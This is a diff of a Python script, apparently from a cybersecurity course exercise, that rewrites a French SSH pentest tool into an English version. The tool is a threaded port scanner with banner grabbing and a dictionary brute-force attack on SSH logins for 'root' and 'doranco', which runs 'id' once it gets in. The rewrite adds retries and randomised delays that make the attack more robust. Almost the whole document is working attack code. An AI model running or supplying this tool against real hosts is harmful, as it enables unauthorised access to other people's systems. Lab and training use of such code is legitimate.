@@ -3,154 +3,153 @@ import sys
 import socket
 import threading
 import time
-import subprocess
+import random
 import os
-
-# Configuration fixe
-DICTIONARY_PATH = r"C:\Users\stagiaire\Documents\cours cyber\github\Cybersec\TP-01\passwords.txt"
-THREAD_LIMIT = 50
-SSH_TIMEOUT = 5
-SCAN_TIMEOUT = 1
-USERS_TO_TEST = ["root", "doranco"]
-
-
-def install_dependencies():
-    """Installe paramiko automatiquement si absent"""
-    try:
-        import paramiko
-    except ImportError:
-        print("[!] Installation du module 'paramiko'...")
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])
-            print("[+] Installation réussie")
-        except Exception as e:
-            print(f"[ERREUR] Impossible d'installer paramiko: {e}")
-            sys.exit(1)
-
-
-install_dependencies()
 from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException
+
+# Configuration
+DICTIONARY_PATH = r"C:\Users\stagiaire\Documents\cours cyber\github\Cybersec\TP-01\passwords.txt"
+THREAD_LIMIT = 30
+SSH_TIMEOUT = 15
+SCAN_TIMEOUT = 2
+BANNER_TIMEOUT = 25
+USERS_TO_TEST = ["root", "doranco"]
+MAX_ATTEMPTS = 3
+DELAY_BETWEEN_ATTEMPTS = 5
 
 
 def clear_screen():
-    """Efface l'écran selon l'OS"""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 
 def show_banner():
-    """Affiche le banner d'introduction"""
     print("""
     ###########################################
-    #      Outil de Pentest SSH               #
-    #      Scanner + Bruteforce               #
-    #      Cibles: root, doranco              #
+    #      Advanced SSH Pentest Tool          #
+    #      Scanner + Bruteforce Combo        #
+    #      Targets: root, doranco            #
     ###########################################
     """)
 
 
 def show_menu():
-    """Affiche le menu principal"""
-    print("\nMenu Principal:")
-    print("1. Scanner les ports ouverts")
-    print("2. Attaque Brute Force SSH")
-    print("3. Scanner puis attaquer (mode complet)")
-    print("4. Quitter")
-    return input("\nChoisissez une option (1-4): ")
+    print("\nMain Menu:")
+    print("1. Port Scanner")
+    print("2. SSH Bruteforce Attack")
+    print("3. Full Scan & Attack")
+    print("4. Exit")
+    return input("\nSelect option (1-4): ")
 
 
-def scan_ports(target, start_port, end_port):
-    """Scan une plage de ports"""
-    open_ports = []
-    print(f"\n[SCAN] Début du scan sur {target} (ports {start_port}-{end_port})...")
+def get_target_info():
+    clear_screen()
+    target = input("Target IP: ").strip()
+    start_port = int(input("Start port [1]: ") or 1)
+    end_port = int(input("End port [1024]: ") or 1024)
+    return target, start_port, end_port
 
-    def worker(port):
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(SCAN_TIMEOUT)
-                if s.connect_ex((target, port)) == 0:
-                    banner = get_service_banner(target, port)
-                    print(f"[+] Port {port}/tcp ouvert - {banner}")
-                    open_ports.append(port)
-        except:
-            pass
+
+def load_passwords():
+    try:
+        with open(DICTIONARY_PATH, 'r', errors='ignore') as f:
+            return [pwd.strip() for pwd in f if pwd.strip()]
+    except FileNotFoundError:
+        print(f"[ERROR] Dictionary file not found: {DICTIONARY_PATH}")
+        sys.exit(1)
+
+
+def scan_port(target, port, results):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(SCAN_TIMEOUT)
+            if s.connect_ex((target, port)) == 0:
+                banner = get_service_banner(target, port)
+                with threading.Lock():
+                    results.append((port, banner))
+                    print(f"[+] Port {port}/tcp open - {banner}")
+    except Exception as e:
+        pass
+
+
+def get_service_banner(target, port):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(SCAN_TIMEOUT)
+            s.connect((target, port))
+            return s.recv(1024).decode(errors='ignore').strip() or "Unknown service"
+    except:
+        return "Unknown service"
+
+
+def run_port_scan(target, start_port, end_port):
+    results = []
+    print(f"\n[SCAN] Scanning {target} (ports {start_port}-{end_port})...")
 
     threads = []
     for port in range(start_port, end_port + 1):
         while threading.active_count() > THREAD_LIMIT:
             time.sleep(0.1)
-        t = threading.Thread(target=worker, args=(port,))
+        t = threading.Thread(target=scan_port, args=(target, port, results))
         t.start()
         threads.append(t)
 
     for t in threads:
         t.join()
 
-    return open_ports
+    return sorted(results, key=lambda x: x[0])
 
 
-def get_service_banner(host, port):
-    """Récupère le banner du service"""
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(SCAN_TIMEOUT)
-            s.connect((host, port))
-            return s.recv(1024).decode(errors='ignore').strip() or "Service inconnu"
-    except:
-        return "Service inconnu"
-
-
-def load_passwords():
-    """Charge les mots de passe depuis le fichier fixe"""
-    try:
-        with open(DICTIONARY_PATH, 'r') as f:
-            passwords = [pwd.strip() for pwd in f if pwd.strip()]
-            if not passwords:
-                print("[ERREUR] Le fichier passwords.txt est vide")
-                sys.exit(1)
-            return passwords
-    except FileNotFoundError:
-        print(f"[ERREUR] Fichier introuvable: {DICTIONARY_PATH}")
-        sys.exit(1)
-
-
-def ssh_attack(target, port, users, passwords):
-    """Effectue l'attaque SSH"""
+def robust_ssh_connect(target, port, username, password):
     ssh = SSHClient()
     ssh.set_missing_host_key_policy(AutoAddPolicy())
 
-    for user in users:
-        print(f"\n[ATTACK] Test sur {user}@{target}:{port}")
+    try:
+        ssh.connect(target, port=port, username=username, password=password,
+                    timeout=SSH_TIMEOUT, banner_timeout=BANNER_TIMEOUT,
+                    allow_agent=False, look_for_keys=False)
+
+        # Execute test command
+        stdin, stdout, stderr = ssh.exec_command('id')
+        user_info = stdout.read().decode().strip()
+
+        print("\n" + "=" * 50)
+        print(f"[SUCCESS] Valid credentials found!")
+        print(f"Username: {username}")
+        print(f"Password: {password}")
+        print(f"SSH Command: ssh {username}@{target} -p {port}")
+        print(f"User Info: {user_info}")
+        print("=" * 50)
+
+        ssh.close()
+        return True
+
+    except AuthenticationException:
+        return False
+    except (SSHException, socket.error) as e:
+        print(f"\n[!] Connection error: {str(e)[:100]}")
+        time.sleep(random.uniform(1, DELAY_BETWEEN_ATTEMPTS))
+        return False
+    except Exception as e:
+        print(f"\n[!] Unexpected error: {str(e)[:100]}")
+        return False
+
+
+def ssh_bruteforce(target, port, passwords):
+    print(f"\n[ATTACK] Starting brute force on {target}:{port}")
+
+    for user in USERS_TO_TEST:
+        print(f"\n[TESTING] Account: {user}")
 
         for password in passwords:
-            try:
-                print(f"[>] Essai: {user}:{password[:20]}{'...' if len(password) > 20 else ''}", end='\r')
+            print(f"[TRY] {user}:{password[:15]}{'...' if len(password) > 15 else ''}", end='\r', flush=True)
 
-                ssh.connect(target, port=port, username=user,
-                            password=password, timeout=SSH_TIMEOUT)
+            for attempt in range(MAX_ATTEMPTS):
+                if robust_ssh_connect(target, port, user, password):
+                    return True
+                elif attempt < MAX_ATTEMPTS - 1:
+                    time.sleep(DELAY_BETWEEN_ATTEMPTS)
 
-                print(f"\n[SUCCÈS] Connexion réussie! {user}:{password}")
-                print("-" * 50)
-                print(f"Commande SSH: ssh {user}@{target} -p {port}")
-
-                # Exemple de commande
-                stdin, stdout, stderr = ssh.exec_command('id')
-                print(f"Info: {stdout.read().decode().strip()}")
-                print("-" * 50)
-
-                ssh.close()
-                return True
-
-            except AuthenticationException:
-                continue
-            except (SSHException, socket.error) as e:
-                print(f"\n[!] Erreur réseau: {str(e)[:100]}")
-                time.sleep(3)
-                break
-            except Exception as e:
-                print(f"\n[!] Erreur inattendue: {str(e)[:100]}")
-                continue
-
-    print("\n[!] Aucune combinaison valide trouvée")
+    print("\n[!] No valid credentials found")
     return False
 
 
@@ -161,65 +160,71 @@ def main():
     while True:
         choice = show_menu()
 
-        if choice == '1':  # Scan seulement
-            target = input("\nAdresse IP cible: ").strip()
-            start_port = int(input("Port de début [1]: ") or 1)
-            end_port = int(input("Port de fin [1024]: ") or 1024)
-
-            open_ports = scan_ports(target, start_port, end_port)
+        if choice == '1':  # Port Scan
+            target, start_port, end_port = get_target_info()
+            open_ports = run_port_scan(target, start_port, end_port)
 
             if open_ports:
-                print("\n[RESULTAT] Ports ouverts:")
-                for port in open_ports:
-                    print(f"- Port {port}: {get_service_banner(target, port)}")
+                print("\n[RESULTS] Open ports:")
+                for port, banner in open_ports:
+                    print(f"- Port {port}: {banner}")
             else:
-                print("\n[-] Aucun port ouvert trouvé")
+                print("\n[-] No open ports found")
 
-            input("\nAppuyez sur Entrée pour continuer...")
+            input("\nPress Enter to continue...")
             clear_screen()
 
-        elif choice == '2':  # Attaque seulement
-            target = input("\nAdresse IP cible: ").strip()
-            port = int(input("Port SSH [22]: ") or 22)
+        elif choice == '2':  # SSH Attack
+            target = input("\nTarget IP: ").strip()
+            port = int(input("SSH port [22]: ") or 22)
             passwords = load_passwords()
 
-            if ssh_attack(target, port, USERS_TO_TEST, passwords):
-                input("\nAppuyez sur Entrée pour continuer...")
+            ssh_bruteforce(target, port, passwords)
+            input("\nPress Enter to continue...")
             clear_screen()
 
-        elif choice == '3':  # Mode complet
-            target = input("\nAdresse IP cible: ").strip()
-            start_port = int(input("Port de début [1]: ") or 1)
-            end_port = int(input("Port de fin [1024]: ") or 1024)
+        elif choice == '3':  # Full Scan & Attack
+            target, start_port, end_port = get_target_info()
             passwords = load_passwords()
 
-            open_ports = scan_ports(target, start_port, end_port)
-            ssh_ports = [p for p in open_ports if 'ssh' in get_service_banner(target, p).lower()]
+            open_ports = run_port_scan(target, start_port, end_port)
+            ssh_ports = [p for p, b in open_ports if 'ssh' in b.lower()]
 
             if ssh_ports:
-                print("\n[ATTACK] Début des attaques sur les ports SSH...")
+                print("\n[SSH PORTS] Found SSH services:")
                 for port in ssh_ports:
-                    if ssh_attack(target, port, USERS_TO_TEST, passwords):
+                    print(f"- Port {port}")
+
+                for port in ssh_ports:
+                    if ssh_bruteforce(target, port, passwords):
                         break
             else:
-                print("\n[-] Aucun service SSH trouvé")
+                print("\n[-] No SSH services detected")
 
-            input("\nAppuyez sur Entrée pour continuer...")
+            input("\nPress Enter to continue...")
             clear_screen()
 
-        elif choice == '4':  # Quitter
-            print("\n[+] Fermeture du programme...")
+        elif choice == '4':  # Exit
+            print("\n[+] Exiting program...")
             sys.exit(0)
 
         else:
-            print("\n[!] Choix invalide")
+            print("\n[!] Invalid option")
             time.sleep(1)
             clear_screen()
 
 
 if __name__ == "__main__":
     try:
+        import paramiko
+    except ImportError:
+        print("[!] Installing paramiko...")
+        import subprocess
+
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])
+
+    try:
         main()
     except KeyboardInterrupt:
-        print("\n[!] Interruption par l'utilisateur")
+        print("\n[!] Interrupted by user")
         sys.exit(0)
